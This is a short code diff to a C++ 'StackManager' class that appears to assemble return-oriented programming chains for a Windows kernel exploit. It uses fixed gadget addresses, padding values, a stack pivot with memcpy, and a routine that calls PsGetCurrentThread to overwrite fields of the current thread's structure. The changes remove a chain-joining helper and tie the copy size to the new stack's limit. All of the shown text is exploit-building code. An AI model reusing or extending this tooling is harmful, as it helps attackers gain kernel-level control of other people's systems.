@@ -33,14 +33,6 @@ void StackManager::AddPadding(const std::size_t PaddingSize)
 		this->AddValue(0xC0FEBABEC0FEBABE, "Padding");
 }
 
-void StackManager::ChainStack(StackManager* NewStack)
-{
-	if (!NewStack)
-		return;
-
-	this->Stack->insert(this->Stack->end(), NewStack->Stack->begin(), NewStack->Stack->end());
-}
-
 void StackManager::ModifyThreadField(const std::uint64_t FieldOffset, const std::uint64_t NewValue)
 {
 	this->AddFunctionCall("PsGetCurrentThread");
@@ -150,7 +142,7 @@ void StackManager::PivotToNewStack(StackManager* NewStack)
     this->AddValue((std::uint64_t)NewStack->StackAllocAddress, "src address");
     this->AddPadding(0x8);
     this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
-    this->AddValue(0x2000, "count value");
+    this->AddValue(NewStack->StackSizeLimit, "count value");
     this->AddPadding(0x28);
     this->AddFunctionCall("memcpy");
 
